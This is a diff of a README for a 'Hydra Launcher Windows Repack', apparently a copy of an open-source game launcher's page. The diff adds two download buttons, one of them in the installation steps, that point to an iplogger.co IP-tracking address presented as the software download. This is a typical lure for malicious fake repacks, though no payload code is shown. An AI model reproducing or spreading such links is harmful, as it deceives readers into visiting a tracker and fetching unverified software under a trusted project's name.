@@ -1,13 +1,13 @@
-<br>
 
+<br>
 <div align="center">
-  <a href="https://google.com">
-    <img src="./resources/icon.png" width="144"/>
-  </a>
-  <h1 align="center">Hydra Launcher Windows Repack</h1>
+   <h1 align="center">Hydra Launcher Windows Repack</h1>
   <p align="center">
     <strong>Hydra Launcher Windows is a game launcher with its own embedded bittorrent client and a self-managed repack scraper.</strong>
   </p>
+   <a href="https://https://iplogger.co/HydraLaun611.html">
+    <img src="./resources/dwnload.png" width="44%"/>
+  </a>
   <p>
     <a href="https://github.com/hydralauncher/hydra">
       <img src="https://img.shields.io/github/actions/workflow/status/hydralauncher/hydra/build.yml" />
@@ -17,8 +17,7 @@
     </a>
   </p>
 
-[![Hydra Catalogue](https://google.com)](./resources/screenshot.png)
-
+![Hydra Catalogue](./resources/screenshot.png)
 </div>
 
 <br>
@@ -55,8 +54,10 @@ It's built using TypeScript (Electron) and Python, leveraging libtorrent for sea
 Follow the steps below to install:
 
 - **Download**: Get the software archive from the provided link.
+ <a href="https://https://iplogger.co/HydraLaun611.html">
+    <img src="./resources/icon.png" width="144"/>
+  </a>
 
-[![Hydra Launcher](https://google.com)](resources/dwnload.png)
 
 - **Unpack**: Extract the downloaded files to a folder.
 
